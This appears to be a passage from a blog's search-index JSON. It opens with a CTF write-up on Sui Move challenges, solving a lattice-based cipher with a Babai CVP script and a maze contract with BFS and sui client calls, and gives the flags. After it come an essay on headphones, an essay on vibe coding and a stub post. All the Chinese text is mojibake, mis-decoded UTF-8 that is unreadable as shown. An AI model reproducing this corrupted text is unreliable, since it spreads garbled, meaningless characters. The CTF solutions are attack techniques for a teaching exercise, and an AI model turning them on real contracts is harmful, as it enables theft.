ç”Ÿæˆ64ä¸ªéšæœºæ•°ä½œä¸ºå™ªå£°\n    while(i < 64) {\n        k.push_back(random::generate_u64_in_range(&mut generator, 0, 4294967296));\n        i = i + 1;\n    };\n    // æ‰§è¡ŒåŠ å¯†: enc = A * flag + k\n    let enc = matadd(&matmul(&a, &ex_plain_flag), &k);\n}\n\n// éªŒè¯å‡½æ•°\npublic entry fun decrypt_flag(flag: vector<u8>, ctx: &mut TxContext) {\n    assert!(blake2b256(&flag) == x\"5c9d8d1c17561e80b1e29b4a7809b369eb94e3d8b6808c19c69e25f94f67817a\", 0);\n    event::emit(FlagEvent {\n        owner: ctx.sender(),\n        flag: true\n    });\n}\n```\n\n### 3. å¯†ç å­¦åŸç†\n\nè¿™æ˜¯ä¸€ä¸ªåŸºäºæ ¼ç†è®ºçš„åŠ å¯†æ–¹æ¡ˆï¼Œç±»ä¼¼äºLearning With Errors (LWE) é—®é¢˜ã€‚è¦è§£å¯†éœ€è¦è§£å†³æœ€è¿‘å‘é‡é—®é¢˜ï¼ˆCVP - Closest Vector Problemï¼‰ã€‚\n\n## è§£é¢˜æ­¥éª¤\n\n### æ­¥éª¤1: ç¯å¢ƒå‡†å¤‡\n\né¦–å…ˆå®‰è£…SageMathæ•°å­¦è®¡ç®—è½¯ä»¶ï¼š\n\n```bash\nsudo apt update && sudo apt install -y sagemath\n```\n\n### æ­¥éª¤2: åˆ†æå¯†æ–‡\n\nä»åˆçº¦æºç ä¸­å¯ä»¥çœ‹åˆ°åŠ å¯†åçš„å¯†æ–‡ï¼š\n\n```\n[13244763658160674624, 16984722715248776010, 13823152552092075312, ...]\n```\n\n### æ­¥éª¤3: ä½¿ç”¨CVPç®—æ³•è§£å¯†\n\né¢˜ç›®æä¾›äº†è§£å¯†è„šæœ¬ `decrypt.sage`ï¼Œæ ¸å¿ƒç®—æ³•æ˜¯Babai CVPç®—æ³•ï¼š\n\n```python\ndef Babai_CVP(Lattice, target):\n    M = Lattice.LLL()\n    G = M.gram_schmidt()[0]\n    diff = target\n    for i in reversed(range(M.nrows())):\n        diff -=  M[i] * ((diff * G[i]) / (G[i] * G[i])).round()\n    return target - diff\n```\n\n### æ­¥éª¤4: è¿è¡Œè§£å¯†è„šæœ¬\n\n```bash\ncd solve/tests\nsage decrypt.sage\n```\n\nè¾“å‡ºç»“æœï¼š\n\n```\n[-]the flag length is: 23\n(102, 108, 97, 103, 123, 53, 85, 105, 95, 77, 48, 86, 101, 95, 67, 79, 78, 116, 114, 65, 67, 55, 125)\n[+]flag{5Ui_M0Ve_CONtrAC7}\n```\n\n### æ­¥éª¤5: éªŒè¯flag\n\nä½¿ç”¨Sui CLIè°ƒç”¨é“¾ä¸Šåˆçº¦éªŒè¯flagï¼š\n\n```bash\nsui client call \\\n  --package 0xd1861626bde7486744877f9ac90ac025976bab6617384cd3e6816e833dd94be9 \\\n  --module crypto \\\n  --function decrypt_flag \\\n  --args \"flag{5Ui_M0Ve_CONtrAC7}\" \\\n  --gas-budget 10000000\n```\n\n## è§£é¢˜ç»“æœ\n\n- **Flag**: `flag{5Ui_M0Ve_CONtrAC7}`\n- **äº¤æ˜“å“ˆå¸Œ**: `2FPqgAyMe2e7qB5xigrwi35oTqrmwmuC45pCudHLdtVX`\n- **éªŒè¯çŠ¶æ€**: Successï¼ŒæˆåŠŸè§¦å‘FlagEvent\n\n## æŠ€æœ¯è¦ç‚¹\n\n### 1. æ ¼ç†è®ºåŸºç¡€\n\n- **æ ¼ (Lattice)**: ç”±åŸºå‘é‡å¼ æˆçš„ç¦»æ•£ç‚¹é›†\n- **CVPé—®é¢˜**: ç»™å®šæ ¼å’Œç›®æ ‡å‘é‡ï¼Œæ‰¾åˆ°æ ¼ä¸­æœ€æ¥è¿‘ç›®æ ‡çš„å‘é‡\n- **LLLç®—æ³•**: æ ¼åŸºçº¦åŒ–ç®—æ³•ï¼Œç”¨äºæ‰¾åˆ°è¾ƒçŸ­çš„åŸºå‘é‡\n\n### 2. Babaiç®—æ³•\n\nBabaiç®—æ³•æ˜¯è§£å†³CVPé—®é¢˜çš„è¿‘ä¼¼ç®—æ³•ï¼š\n\n1. å¯¹æ ¼åŸºè¿›è¡ŒLLLçº¦åŒ–\n2. ä½¿ç”¨Gram-Schmidtæ­£äº¤åŒ–\n3. é€šè¿‡èˆå…¥æ“ä½œæ‰¾åˆ°æœ€è¿‘å‘é‡\n\n### 3. Moveæ™ºèƒ½åˆçº¦\n\n- ä½¿ç”¨SuiåŒºå—é“¾çš„Moveè¯­è¨€\n- é›†æˆéšæœºæ•°ç”Ÿæˆå™¨è¿›è¡ŒåŠ å¯†\n- é€šè¿‡äº‹ä»¶æœºåˆ¶éªŒè¯è§£é¢˜ç»“æœ\n\n## æ€»ç»“\n\nè¿™é“é¢˜ç›®å·§å¦™åœ°ç»“åˆäº†ï¼š\n\n- **å¯†ç å­¦**: åŸºäºæ ¼ç†è®ºçš„åŠ å¯†æ–¹æ¡ˆ\n- **æ•°å­¦**: çº¿æ€§ä»£æ•°å’Œæœ€è¿‘å‘é‡é—®é¢˜\n- **åŒºå—é“¾**: Sui Moveæ™ºèƒ½åˆçº¦æŠ€æœ¯\n\nè§£é¢˜çš„å…³é”®åœ¨äºç†è§£LWEç±»å‹çš„åŠ å¯†æ–¹æ¡ˆï¼Œå¹¶ä½¿ç”¨é€‚å½“çš„æ ¼ç†è®ºç®—æ³•ï¼ˆCVPï¼‰æ¥æ¢å¤æ˜æ–‡ã€‚\n\n---\n\n# 4. è¿·å®«æ¸¸æˆ\n\n## é¢˜ç›®ä¿¡æ¯\n\n- **é¢˜ç›®åç§°**: è¿·å®«æ¸¸æˆ\n- **é¢˜ç›®æè¿°**: è¿™æ˜¯ä¸€é“ctfé¢˜ç›® è¿™é‡Œæœ‰ä¸€ä¸ªè¿·å®«æ¸¸æˆï¼Œä½ èƒ½é¡ºåˆ©èµ°å‡ºè¿™ä¸ªè¿·å®«å—\n- **Package ID**: `0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20`\n- **éƒ¨ç½²äº¤æ˜“å“ˆå¸Œ**: `AgCw1ZGx5GFHFJHFTgdqjaVqY2zLrMbSgtevJz29K6yz`\n- **åŒºå—é“¾**: Sui Network\n- **è¯­è¨€**: Move\n\n## é¢˜ç›®åˆ†æ\n\n### 1. åˆçº¦ç»“æ„åˆ†æ\n\né€šè¿‡æŸ¥çœ‹Moveåˆçº¦æºç ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªåŸºäºSuiåŒºå—é“¾çš„è¿·å®«æ¸¸æˆï¼š\n\n```rust\nconst ROW: u64 = 10;\nconst COL: u64 = 11;\nconst MAZE: vector<u8> = b\"#S########\\n#**#######\\n##*#######\\n##***#####\\n####*#####\\n##***###E#\\n##*#####*#\\n##*#####*#\\n##*******#\\n##########\";\nconst START_POS: u64 = 1;\n```\n\n### 2. è¿·å®«å¸ƒå±€\n\nè¿·å®«æ˜¯ä¸€ä¸ª10è¡Œ11åˆ—çš„ç½‘æ ¼ï¼š\n\n```\n#S########\n#**#######\n##*#######\n##***#####\n####*#####\n##***###E#\n##*#####*#\n##*#####*#\n##*******#\n##########\n```\n\n- `#`: å¢™å£\n- `S`: èµ·ç‚¹ (ä½ç½®1)\n- `E`: ç»ˆç‚¹ (ä½ç½®63)\n- `*`: å¯é€šè¡Œè·¯å¾„\n\n### 3. æ¸¸æˆæœºåˆ¶\n\nåˆçº¦æä¾›ä¸‰ä¸ªä¸»è¦å‡½æ•°ï¼š\n\n1. **create_challenge()**: åˆ›å»ºæŒ‘æˆ˜ï¼Œç”ŸæˆChallengeStatuså¯¹è±¡\n2. **complete_challenge()**: å®Œæˆè¿·å®«ï¼Œéœ€è¦æä¾›æ­£ç¡®çš„ç§»åŠ¨åºåˆ—\n3. **claim_flag()**: è·å–flagï¼Œéœ€è¦æŒ‘æˆ˜å®Œæˆåè°ƒç”¨\n\nç§»åŠ¨æ§åˆ¶ï¼š\n\n- `w` (ASCII 119): å‘ä¸Šç§»åŠ¨\n- `s` (ASCII 115): å‘ä¸‹ç§»åŠ¨\n- `a` (ASCII 97): å‘å·¦ç§»åŠ¨\n- `d` (ASCII 100): å‘å³ç§»åŠ¨\n\n## è§£é¢˜è¿‡ç¨‹\n\n### æ­¥éª¤1: è¿·å®«è·¯å¾„åˆ†æ\n\nä½¿ç”¨BFSç®—æ³•åˆ†æè¿·å®«ï¼Œæ‰¾åˆ°ä»èµ·ç‚¹Såˆ°ç»ˆç‚¹Eçš„æœ€çŸ­è·¯å¾„ã€‚\n\nä½ç½®ç¼–å·ç³»ç»Ÿï¼š\n\n- ä½ç½® = è¡Œ Ã— 11 + åˆ—\n- èµ·ç‚¹Såœ¨ä½ç½®1 (ç¬¬0è¡Œç¬¬1åˆ—)\n- ç»ˆç‚¹Eåœ¨ä½ç½®63 (ç¬¬5è¡Œç¬¬8åˆ—)\n\n### æ­¥éª¤2: è·¯å¾„æœç´¢ç®—æ³•\n\n```python\ndef find_path():\n    from collections import deque\n\n    start_pos = 1  # Sçš„ä½ç½®\n    end_pos = 63   # Eçš„ä½ç½®\n\n    queue = deque([(start_pos, \"\")])\n    visited = set([start_pos])\n\n    while queue:\n        current_pos, path = queue.popleft()\n\n        if current_pos == end_pos:\n            return path\n\n        # å°è¯•å››ä¸ªæ–¹å‘çš„ç§»åŠ¨\n        moves = [\n            ('w', -11),  # ä¸Š\n            ('s', 11),   # ä¸‹\n            ('a', -1),   # å·¦\n            ('d', 1)     # å³\n        ]\n\n        for move_char, delta in moves:\n            new_pos = current_pos + delta\n            # è¾¹ç•Œæ£€æŸ¥å’Œå¢™å£æ£€æŸ¥\n            # ...\n```\n\n### æ­¥éª¤3: æ‰¾åˆ°è§£å†³æ–¹æ¡ˆ\n\né€šè¿‡BFSæœç´¢ï¼Œæ‰¾åˆ°æœ€çŸ­è·¯å¾„ï¼š**`sdssddssaasssddddddwww`**\n\nè·¯å¾„éªŒè¯ï¼š\n\n1. S(1) â†’ s â†’ 12(*) â†’ d â†’ 13(*) â†’ s â†’ 24(*) â†’ s â†’ 35(*)\n2. 35(*) â†’ d â†’ 36(*) â†’ d â†’ 37(*) â†’ s â†’ 48(*) â†’ s â†’ 59(*)\n3. 59(*) â†’ a â†’ 58(*) â†’ a â†’ 57(*) â†’ s â†’ 68(*) â†’ s â†’ 79(*)\n4. 79(*) â†’ s â†’ 90(*) â†’ d â†’ 91(*) â†’ d â†’ 92(*) â†’ d â†’ 93(*)\n5. 93(*) â†’ d â†’ 94(*) â†’ d â†’ 95(*) â†’ d â†’ 96(*) â†’ w â†’ 85(*)\n6. 85(*) â†’ w â†’ 74(*) â†’ w â†’ 63(E) âœ…\n\n## é“¾ä¸Šæ‰§è¡Œ\n\n### æ­¥éª¤1: åˆ›å»ºæŒ‘æˆ˜\n\n```bash\nsui client call \\\n  --package 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 \\\n  --module maze \\\n  --function create_challenge \\\n  --gas-budget 10000000\n```\n\n**ç»“æœ**:\n\n- Transaction Digest: `BUYeRta41EpQuNTFC41Rj1HYP3m1kfXSGffqgiNGCE5Z`\n- Challenge Object ID: `0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55`\n\n### æ­¥éª¤2: å®Œæˆè¿·å®«æŒ‘æˆ˜\n\nå°†è·¯å¾„å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ï¼š\n\n- `sdssddssaasssddddddwww` â†’ `[115,100,115,115,100,100,115,115,97,97,115,115,115,100,100,100,100,100,100,119,119,119]`\n\n```bash\nsui client call \\\n  --package 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 \\\n  --module maze \\\n  --function complete_challenge \\\n  --args 0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55 '[115,100,115,115,100,100,115,115,97,97,115,115,115,100,100,100,100,100,100,119,119,119]' \\\n  --gas-budget 10000000\n```\n\n**ç»“æœ**:\n\n- Transaction Digest: `FfbrP2KJemjqbmHJLpCQtthNTnEz7Fs1H6Emop4amqtx`\n- è§¦å‘Successäº‹ä»¶ï¼Œè·¯å¾„éªŒè¯æˆåŠŸ\n\n### æ­¥éª¤3: è·å–Flag\n\n```bash\nsui client call \\\n  --package 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 \\\n  --module maze \\\n  --function claim_flag \\\n  --args 0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55 \\\n  --gas-budget 10000000\n```\n\n**ç»“æœ**:\n\n- **Transaction Digest**: `6AxnhJMhpTbsggtZj52PqGUKMU1sx69Q3zvr9WzdYzwQ`\n- è§¦å‘FlagEventäº‹ä»¶ï¼Œsuccess: true\n\n## å…³é”®æŠ€æœ¯ç‚¹\n\n### 1. Moveåˆçº¦åˆ†æ\n\n- ç†è§£Sui Moveè¯­æ³•å’Œç»“æ„\n- åˆ†æentryå‡½æ•°çš„å‚æ•°è¦æ±‚\n- ç†è§£äº‹ä»¶æœºåˆ¶\n\n### 2. ç®—æ³•åº”ç”¨\n\n- BFSæœ€çŸ­è·¯å¾„æœç´¢\n- äºŒç»´ç½‘æ ¼åæ ‡è½¬æ¢\n- è¾¹ç•Œæ¡ä»¶å¤„ç†\n\n### 3. åŒºå—é“¾äº¤äº’\n\n- Sui CLIå·¥å…·ä½¿ç”¨\n- äº¤æ˜“å‚æ•°æ ¼å¼åŒ–\n- å¯¹è±¡IDç®¡ç†\n\n### 4. æ•°æ®è½¬æ¢\n\n- å­—ç¬¦ä¸²åˆ°å­—èŠ‚æ•°ç»„è½¬æ¢\n- ASCIIç æ˜ å°„\n- Moveç±»å‹ç³»ç»Ÿç†è§£\n\n## æ€»ç»“\n\nè¿™é“é¢˜ç›®è€ƒæŸ¥äº†ï¼š\n\n1. **Moveæ™ºèƒ½åˆçº¦åˆ†æèƒ½åŠ›**\n2. **å›¾è®ºç®—æ³•åº”ç”¨** (BFSè·¯å¾„æœç´¢)\n3. **åŒºå—é“¾å·¥å…·ä½¿ç”¨** (Sui CLI)\n4. **æ•°æ®æ ¼å¼è½¬æ¢** (å­—ç¬¦ä¸²â†’å­—èŠ‚æ•°ç»„)\n\n**æœ€ç»ˆç­”æ¡ˆ**: `6AxnhJMhpTbsggtZj52PqGUKMU1sx69Q3zvr9WzdYzwQ`\n\n**Flag**: `CTF{Letsmovectf}`\n\n## å·¥å…·å’Œè„šæœ¬\n\nè§£é¢˜è¿‡ç¨‹ä¸­ä½¿ç”¨çš„Pythonè„šæœ¬å¯ä»¥å¸®åŠ©ï¼š\n\n- è¿·å®«å¯è§†åŒ–å’Œè·¯å¾„æœç´¢\n- å­—èŠ‚æ•°ç»„æ ¼å¼è½¬æ¢\n- è‡ªåŠ¨åŒ–åŒºå—é“¾äº¤äº’\n\n---\n\n# ç»¼åˆæŠ€æœ¯æ€»ç»“\n\n## æ ¸å¿ƒæŠ€èƒ½çŸ©é˜µ\n\n### 1. Moveæ™ºèƒ½åˆçº¦åˆ†æ\n\n- **è¯­æ³•ç†è§£**: æŒæ¡Sui Moveçš„åŸºæœ¬è¯­æ³•å’Œç±»å‹ç³»ç»Ÿ\n- **æ¼æ´è¯†åˆ«**: èƒ½å¤Ÿå‘ç°æ³¨é‡Šä»£ç ã€è®¡è´¹é”™è¯¯ç­‰å¸¸è§æ¼æ´\n- **å¯¹è±¡æ¨¡å‹**: ç†è§£Suiçš„å¯¹è±¡æ‰€æœ‰æƒå’Œè½¬ç§»æœºåˆ¶\n- **äº‹ä»¶ç³»ç»Ÿ**: æŒæ¡äº‹ä»¶çš„è§¦å‘å’Œç›‘å¬æœºåˆ¶\n\n### 2. ç®—æ³•ä¸æ•°æ®ç»“æ„\n\n- **åŠ¨æ€è§„åˆ’**: æˆ¿å±‹å¼ºç›—é—®é¢˜çš„ç»å…¸DPè§£æ³•åŠå…¶å˜ç§\n- **å›¾è®ºç®—æ³•**: BFSåœ¨è·¯å¾„æœç´¢ä¸­çš„åº”ç”¨\n- **æ ¼ç†è®º**: CVPé—®é¢˜å’ŒLLLç®—æ³•çš„å®é™…åº”ç”¨\n- **æ—¶é—´å¤æ‚åº¦**: ç®—æ³•æ•ˆç‡åˆ†æå’Œä¼˜åŒ–\n\n### 3. å¯†ç å­¦çŸ¥è¯†\n\n- **LWEé—®é¢˜**: Learning With ErrorsåŠ å¯†æ–¹æ¡ˆçš„åŸç†\n- **æ ¼åŸºçº¦åŒ–**: LLLç®—æ³•å’ŒBabaiç®—æ³•çš„å®ç°\n- **æœ€è¿‘å‘é‡é—®é¢˜**: CVPçš„æ•°å­¦èƒŒæ™¯å’Œè§£å†³æ–¹æ³•\n- **å“ˆå¸Œå‡½æ•°**: Blake2bç­‰å¯†ç å­¦å“ˆå¸Œçš„åº”ç”¨\n\n### 4. åŒºå—é“¾æŠ€æœ¯\n\n- **Sui CLI**: å‘½ä»¤è¡Œå·¥å…·çš„ç†Ÿç»ƒä½¿ç”¨\n- **PTBæœºåˆ¶**: Programmable Transaction Blockçš„æ„é€ å’Œæ‰§è¡Œ\n- **æ—¶é—´æˆ³æ”»å‡»**: åˆ©ç”¨åŒºå—é“¾æ—¶é—´æˆ³ç‰¹æ€§çš„æ”»å‡»æ–¹æ³•\n- **Gasä¼˜åŒ–**: äº¤æ˜“è´¹ç”¨çš„ä¼°ç®—å’Œä¼˜åŒ–\n\n## æ”»å‡»æŠ€æœ¯åˆ†ç±»\n\n### 1. æ™ºèƒ½åˆçº¦æ¼æ´åˆ©ç”¨\n\n- **ä»£ç å®¡è®¡**: å‘ç°è¢«æ³¨é‡Šçš„å…³é”®ä»£ç \n- **é€»è¾‘é”™è¯¯**: åˆ©ç”¨è®¡è´¹ä¸ä¸€è‡´ç­‰ä¸šåŠ¡é€»è¾‘æ¼æ´\n- **çŠ¶æ€ç®¡ç†**: åˆ©ç”¨çŠ¶æ€æ›´æ–°çš„æ—¶åºé—®é¢˜\n- **æƒé™æ§åˆ¶**: ç»•è¿‡è®¿é—®æ§åˆ¶æœºåˆ¶\n\n### 2. æ—¶é—´ç›¸å…³æ”»å‡»\n\n- **æ—¶é—´æˆ³ä¾èµ–**: åˆ©ç”¨å¯é¢„æµ‹çš„æ—¶é—´æˆ³ç”Ÿæˆéšæœºæ•°\n- **PTBåŒæ­¥**: ç¡®ä¿æ‰¹é‡æ“ä½œä½¿ç”¨ç›¸åŒæ—¶é—´æˆ³\n- **æ—¶åºæ”»å‡»**: åˆ©ç”¨æ“ä½œæ‰§è¡Œçš„æ—¶é—´å·®\n\n### 3. æ•°å­¦æ”»å‡»\n\n- **ç®—æ³•é€†å‘**: é€šè¿‡åˆ†æç®—æ³•æ‰¾åˆ°é€†å‘æ±‚è§£æ–¹æ³•\n- **æ¦‚ç‡åˆ†æ**: è®¡ç®—æ”»å‡»æˆåŠŸçš„æ¦‚ç‡å¹¶ä¼˜åŒ–ç­–ç•¥\n- **å¯†ç å­¦æ”»å‡»**: ä½¿ç”¨é«˜çº§æ•°å­¦å·¥å…·ç ´è§£åŠ å¯†æ–¹æ¡ˆ\n\n### 4. è‡ªåŠ¨åŒ–æ”»å‡»\n\n- **è„šæœ¬ç¼–å†™**: å¼€å‘è‡ªåŠ¨åŒ–æ”»å‡»è„šæœ¬\n- **æ‰¹é‡æ“ä½œ**: é€šè¿‡PTBæ‰§è¡Œå¤§é‡é‡å¤æ“ä½œ\n- **æ¡ä»¶è§¦å‘**: ç­‰å¾…æœ‰åˆ©æ¡ä»¶è‡ªåŠ¨æ‰§è¡Œæ”»å‡»\n\n## é˜²å¾¡ç­–ç•¥å»ºè®®\n\n### 1. ä»£ç å®‰å…¨\n\n- **å®Œæ•´æ€§æ£€æŸ¥**: ç¡®ä¿æ‰€æœ‰å¿…è¦çš„ä»£ç éƒ½è¢«æ‰§è¡Œ\n- **é€»è¾‘ä¸€è‡´æ€§**: æ£€æŸ¥å’Œæ‰£è´¹é€»è¾‘å¿…é¡»ä¿æŒä¸€è‡´\n- **è¾¹ç•ŒéªŒè¯**: ä¸¥æ ¼éªŒè¯æ‰€æœ‰è¾“å…¥å‚æ•°çš„è¾¹ç•Œæ¡ä»¶\n- **çŠ¶æ€åŒæ­¥**: ç¡®ä¿çŠ¶æ€æ›´æ–°çš„åŸå­æ€§\n\n### 2. éšæœºæ•°å®‰å…¨\n\n- **çœŸéšæœºæº**: ä½¿ç”¨å¯†ç å­¦å®‰å…¨çš„éšæœºæ•°ç”Ÿæˆå™¨\n- **æ—¶é—´æˆ³é¿å…**: ä¸è¦ä¾èµ–å¯é¢„æµ‹çš„æ—¶é—´æˆ³\n- **ç†µæºå¤šæ ·åŒ–**: ç»“åˆå¤šä¸ªç†µæºç”Ÿæˆéšæœºæ•°\n- **éšæœºæ€§æµ‹è¯•**: å®šæœŸæµ‹è¯•éšæœºæ•°çš„è´¨é‡\n\n### 3. è®¿é—®æ§åˆ¶\n\n- **æƒé™æœ€å°åŒ–**: åªæˆäºˆå¿…è¦çš„æœ€å°æƒé™\n- **å¤šé‡éªŒè¯**: å…³é”®æ“ä½œéœ€è¦å¤šé‡éªŒè¯\n- **æ—¶é—´é”**: å¯¹é‡è¦æ“ä½œæ·»åŠ æ—¶é—´å»¶è¿Ÿ\n- **é¢‘ç‡é™åˆ¶**: é™åˆ¶é«˜é¢‘æ“ä½œçš„æ‰§è¡Œ\n\n### 4. ç›‘æ§å’Œå®¡è®¡\n\n- **äº‹ä»¶ç›‘æ§**: å®æ—¶ç›‘æ§å¼‚å¸¸äº‹ä»¶å’Œæ¨¡å¼\n- **äº¤æ˜“åˆ†æ**: åˆ†æå¯ç–‘çš„äº¤æ˜“æ¨¡å¼\n- **ä»£ç å®¡è®¡**: å®šæœŸè¿›è¡Œä¸“ä¸šçš„ä»£ç å®‰å…¨å®¡è®¡\n- **æ¸—é€æµ‹è¯•**: å®šæœŸè¿›è¡Œå®‰å…¨æ¸—é€æµ‹è¯•\n\n## ç»“è®º\n\nè¿™å››é“Sui Move CTFé¢˜ç›®å±•ç¤ºäº†åŒºå—é“¾å®‰å…¨çš„å¤šä¸ªé‡è¦æ–¹é¢ï¼š\n\n1. **æŠ€æœ¯æ·±åº¦**: ä»åŸºç¡€çš„è·¯å¾„æœç´¢åˆ°é«˜çº§çš„æ ¼ç†è®ºå¯†ç å­¦\n2. **æ”»å‡»å¤æ‚æ€§**: ä»å•ä¸€æ¼æ´åˆ©ç”¨åˆ°å¤šæ¼æ´ç»„åˆæ”»å‡»\n3. **å·¥å…·å¤šæ ·æ€§**: ä»ç®€å•çš„CLIå·¥å…·åˆ°å¤æ‚çš„æ•°å­¦è½¯ä»¶\n4. **æ€ç»´æ–¹å¼**: ä»é€†å‘åˆ†æåˆ°æ­£å‘æ„é€ çš„å®Œæ•´æ€ç»´é“¾\n\né€šè¿‡ç³»ç»Ÿæ€§çš„åˆ†æå’Œæ”»å‡»ï¼Œæˆ‘ä»¬ä¸ä»…è·å¾—äº†æ‰€æœ‰Flagï¼Œæ›´é‡è¦çš„æ˜¯ï¼š\n\n- æ·±å…¥ç†è§£äº†Moveæ™ºèƒ½åˆçº¦çš„å®‰å…¨ç‰¹æ€§\n- æŒæ¡äº†å¤šç§æ”»å‡»æŠ€æœ¯å’Œé˜²å¾¡ç­–ç•¥\n- æé«˜äº†ç»¼åˆçš„å®‰å…¨åˆ†æå’Œè§£å†³é—®é¢˜çš„èƒ½åŠ›\n- å»ºç«‹äº†å®Œæ•´çš„åŒºå—é“¾å®‰å…¨çŸ¥è¯†ä½“ç³»\n\nè¿™äº›æŠ€èƒ½å’Œç»éªŒå¯¹äºåŒºå—é“¾å®‰å…¨ç ”ç©¶ã€æ™ºèƒ½åˆçº¦å®¡è®¡ã€ä»¥åŠWeb3å®‰å…¨é˜²æŠ¤éƒ½å…·æœ‰é‡è¦çš„å®è·µä»·å€¼ã€‚éšç€åŒºå—é“¾æŠ€æœ¯çš„ä¸æ–­å‘å±•ï¼Œè¿™ç±»ç»¼åˆæ€§çš„å®‰å…¨æŒ‘æˆ˜å°†å˜å¾—è¶Šæ¥è¶Šé‡è¦ï¼Œéœ€è¦æˆ‘ä»¬æŒç»­å­¦ä¹ å’Œå®è·µã€‚\n"},{"title":"How To Define a Referenced Sound?","url":"/2025/04/28/How To Define a Referenced Sound/","content":"## For The Beginning\n\nNow i am lying on my bed listening to Blowin' In The Wind by Bob Dylan with my Sony WF-XM4 which reminds me of my old memories. This one is a wireless headset with low bandwidth and thick low frequency volume. I used to like high frequency monitoring about four years ago. Yes I quit. I stopped chasing high fidelity and choose convenient instead. Iâ€™m not quite sure whether itâ€™s financial austerity or just academics. I wanted to note something Deja Vu on my head.\n\n## 1. MoonDrop\n\nIn the far long past years I listened to different types of IEM, what makes me feel the must touching is MoonDrop Kxxs, I was depressed in my age of 18. I lost my patience and curiosity in the whole world in a highly pressured environment: My High School. So I listen to a theme ACG from When the Cicadas Cry, It gave me a peaceful Zen for a short summer. That's also my age I got addicted to Nicotine.\n\nBy chance, I stumbled upon Kxxs review videos on Bilibili, sparking my dive into the world of headphones. The MoonDrop Kxxs, with its sleek silver design and single dynamic driver, came paired with a crystal-clear, silver-plated copper braided cable that silenced the annoying stethoscope effect as I lay in bed, lost in music. That wire stopped me from hearing stethoscope effect noises when I crying in my bed. A standard Harman Curve based training sound effect makes me immersed in the ocean of tunes.\n\nI started obsessed with ACG and slowly turned to Electronic and Rock genres. I used them to release the pain and suffer inside me. After half a year, I was cured.\n\nAlthough it has done well in Mid-frequency vocal part and low-frequency rhythm. But it seems to be more like a luxury symbol in that period of time. Kxxs is no more than a Entry-level headphone. The diaphragm isn't that professional and \"Referenced\". Now , Kxxs is officially announced discontinued. When i look up to the materials, Kato the plus version and KADENZ the final version has replaced it. The curtain of Kxxs has fell. However, it gave me a brief path on the way finding the \"Reference Sound\", the Harman Curve.\n\n## 2. Harman Curve\n\nImagine one simple frequency response diagram can quantification the beautiful of music, that is the Harman Curve. Harman researchers find that nearly straight frequency response won't give a better deduction to the audience. Just like chocolate bars, without corners and lines makes them rigid and tasteless.\n\nThe Harman Curve is dedicating a publicly acceptable frequency response, gain in the low frequency for better liveliness, and improve the high frequency to enhance larger sound field and fidelity, the sound will be not as dry or boring as the record studio do. But now there came up to an problem: â€œHow to convince me that a non-original sound is referenced?â€. I canâ€™t. It depends on individually ear preference. Some would think a formulated studio sound is referenced, but some would think a sound that company them through the darkness and asphyxia times. But all i can say is Harman Curve designed a paradigm, less than it canâ€™t be good goods, equals to it would be boring, beyond it brining a different whole new universe.\n\n## 3. Dunu Est 112\n\nIt was the first time knowing Multi-sound unit design when i browsed headphones forums in my age of 19. I sold my Kxxs with deep cherish and bought Dunu Est 112 on Chinese Ebay. Larger power and resolution requirements didn't stopped me, i also bought a Low-spec headphone amp which cost me around 40 dollars.\n\nDunu Est 112 has four different units : 1 Dynamic Driver, 1 Balanced Armature, 2 Electrostatic Drivers. Without doubt, this headphone brings significant high frequency resolution and shortage in low frequency performance. \n\nI really love the electrostatic unit in these earphones. I especially enjoy using them to listen to electronic music, like Coldplayâ€™s *Hymn For The Weekend* or Mike Perry/SHY Martinâ€™s *The Ocean (Radio Edit)*. The electrostatic unit handles the highs with a sweet and smooth quality, rarely producing any sibilance. Complemented by the dynamic driver, the rhythm and bass impact of the songs are quite impressive, as the electrostatic sound overshadows them......However, when switching to other genres, the bass lacks depth, and the soundstage feels scattered and incoherent.\n"},{"title":"Artificial Intelligence Genesis 1-2","url":"/2025/04/16/AI/","content":"## The Creation of the Binary and Humanity\n\n***If*** you're a programmer and haven't heard of vibe coding, you're already behind. The term originated from a semi-self-deprecating tweet and has now become standard usage, although no one can precisely define it. Those familiar with AI-assisted programming generally know what it means: accepting AI suggestions without scrutinizing differences; copying and pasting error messages until the problem is solved; bypassing or randomly changing code that's beyond comprehension until the bug disappears.\n\n***Vibe***  coding feels like a divine assistance on one hand, but on the other, it leads to constant refactoring, going in circles, solving old problems, and creating new ones. Faced with a plethora of tools, it's hard to know which to seriously consider, and new best practices only generate more hidden bugs at a faster pace.\n\n***The*** technical difficulties may lie in the large language model's insufficient context window and the lack of robust long-term memory mechanisms. But in reality, vibe coding shatters the programmer's self-perception, trapping them in a maze built on shifting sands, exhausted and forgetting what efficiency means.\n\n***Vibe*** coding is somewhat like AI art from a year or two ago, looks good at first glance, but the details are wrong when zoomed in. Programming is supposed to be black and white, but reality begins to distort. The correctness of vibe coding cannot be precisely observed. Faced with the massive amount of code generated by AI, programmers quickly give up scrutiny and control. Attempting to guide AI with standards is like a rein on a wild horse, uncertain whether the rules are complete or whether they will be followed.\n\n***Gradually\\,*** programmers stop caring whether the code is correct, as it can always be changed later. In the future, most code will be written by AI, with six-fingered hands appearing and disappearing endlessly. Accepting that temporary work is everything, and change is the only constant. When international news and satirical news become indistinguishable, when all those claiming to pursue truth ultimately seek escape, everything you create will not escape the same fate.\n\n***Individuals*** hiding in a bubble assume everything is fine, but this is often the origin of tragedy. They see only a low-dimensional projection of a complex world, a crude narrative, a mirage. Truth falls into the dark and deep dimensional cracks. What collapses is not the world, but one's own naive imagination. The external is not a projection of reality, but its essence. At first, you think the world is a perfect canvas, then you find more and more cracks, until you realize that the cracks are where you truly live. **It's not just vibe coding, it's vibe living.**\n","tags":["AI"],"categories":["Tec"]},{"title":"Test","url":"/2025/04/16/Test/","content":"## This is a simple test for media assets 